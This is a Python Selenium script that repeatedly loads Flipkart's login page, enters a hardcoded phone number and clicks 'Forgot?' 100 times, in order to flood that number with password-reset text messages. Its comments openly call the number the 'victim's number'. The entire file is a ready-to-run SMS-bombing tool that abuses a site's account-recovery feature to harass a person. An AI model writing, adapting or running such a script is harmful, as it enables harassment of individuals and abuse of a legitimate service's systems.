
from selenium import webdriver
import time
from webdriver_manager.chrome import ChromeDriverManager

# create instance of Chrome webdriver
browser = webdriver.Chrome(ChromeDriverManager().install())
# set the frequency of sms which is approx maximum to 10 per 24 days
frequency = 100

# target mobile number, change it to victim's number and
# also ensure that it's registered on flipkart
mobile_number = '1080329680'

for i in range(frequency):
    browser.get('https://www.flipkart.com/account/login?ret=/')

    # find the element where we have to
    # enter the number using the class name
    number = browser.find_element_by_xpath(
        '//*[@id="container"]/div/div[3]/div/div[2]/div/form/div[1]/input')

    # automatically type the target number
    number.send_keys('1080329680')

    # find the element to send a forgot password
    # request using it's class name
    forgot = browser.find_element_by_link_text('Forgot?')

    # clicking on that element
    forgot.click()

    # set the interval to send each sms
    time.sleep(2)

# Close the browser
browser.quit()
